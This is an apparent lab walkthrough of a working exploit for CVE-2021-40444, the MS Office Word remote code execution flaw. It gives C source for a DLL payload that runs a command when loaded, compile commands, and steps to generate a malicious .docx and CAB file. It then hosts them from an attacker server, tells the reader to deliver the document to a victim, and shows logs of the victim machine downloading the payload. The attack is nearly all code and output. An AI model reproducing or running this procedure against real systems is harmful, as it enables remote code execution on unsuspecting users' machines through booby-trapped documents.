Link : https://github.com/lockedbyte/CVE-2021-40444

Install requirement

	sudo apt-get install lcab
	
create a file and save as whoami.c


	#include <windows.h>

	void exec(void) {
		system("whoami >> C:\\Users\\testuser\\AppData\\Local\\Temp\\tmp.txt");
		return;
	}

	BOOL WINAPI DllMain(
		HINSTANCE hinstDLL,
		DWORD fdwReason, 
		LPVOID lpReserved )
	{
		switch( fdwReason ) 
		{ 
			case DLL_PROCESS_ATTACH:
			   exec(); 
			   break;

			case DLL_THREAD_ATTACH:
				break;

			case DLL_THREAD_DETACH:
				break;

			case DLL_PROCESS_DETACH:
				break;
		}
		return TRUE;
	}
	
Compile whoami.c , this will generate "whoami.dll"

	┌──(kali㉿kali)-[~/Desktop]
	└─$ i686-w64-mingw32-gcc -shared whoami.c -o whoami.dll


Generate malicious .docx file

	┌──(kali㉿kali)-[~/Desktop/CVE-2021-40444]
	└─$ python3 exploit.py generate whoami.dll http://192.168.200.101 
	[%] CVE-2021-40444 - MS Office Word RCE Exploit [%]
	[*] Option is generate a malicious payload...

	[ == Options == ]
			[ DLL Payload: whoami.dll
			[ HTML Exploit URL: http://192.168.200.101

	[*] Writing HTML Server URL...
	[*] Generating malicious docx file...
	  adding: [Content_Types].xml (deflated 75%)
	  adding: _rels/ (stored 0%)
	  adding: _rels/.rels (deflated 61%)
	  adding: docProps/ (stored 0%)
	  adding: docProps/app.xml (deflated 48%)
	  adding: docProps/core.xml (deflated 50%)
	  adding: word/ (stored 0%)
	  adding: word/fontTable.xml (deflated 74%)
	  adding: word/settings.xml (deflated 63%)
	  adding: word/webSettings.xml (deflated 57%)
	  adding: word/styles.xml (deflated 89%)
	  adding: word/document.xml (deflated 85%)
	  adding: word/theme/ (stored 0%)
	  adding: word/theme/theme1.xml (deflated 79%)
	  adding: word/_rels/ (stored 0%)
	  adding: word/_rels/document.xml.rels (deflated 75%)
	[*] Generating malicious CAB file...
	[*] Updating information on HTML exploit...
	[+] Malicious Word Document payload generated at: out/document.docx
	[+] Malicious CAB file generated at: srv/word.cab
	[i] You can execute now the server and then send document.docx to target


Start server on kali

	┌──(kali㉿kali)-[~/Desktop/CVE-2021-40444]
	└─$ sudo python3 exploit.py host 80                              

	[%] CVE-2021-40444 - MS Office Word RCE Exploit [%]
	[*] Option is host HTML Exploit...
	Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
	
Upload document.docx to victim make it runs. When victim runs it our server will look like

	┌──(kali㉿kali)-[~/Desktop/CVE-2021-40444]
	└─$ sudo python3 exploit.py host 80                              

	[%] CVE-2021-40444 - MS Office Word RCE Exploit [%]
	[*] Option is host HTML Exploit...
	Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "GET /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] code 501, message Unsupported method ('OPTIONS')
	192.168.200.112 - - [14/Sep/2021 12:10:24] "OPTIONS / HTTP/1.1" 501 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "GET /word.html HTTP/1.1" 304 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:24] "HEAD /word.html HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:25] "GET /word.cab HTTP/1.1" 200 -
	192.168.200.112 - - [14/Sep/2021 12:10:28] "HEAD /word.html HTTP/1.1" 200 -


In "C:\Users\testuser\AppData\Local\Temp\tmp.txt" you will found whoami output

	valhalla\testuser
	valhalla\testuser
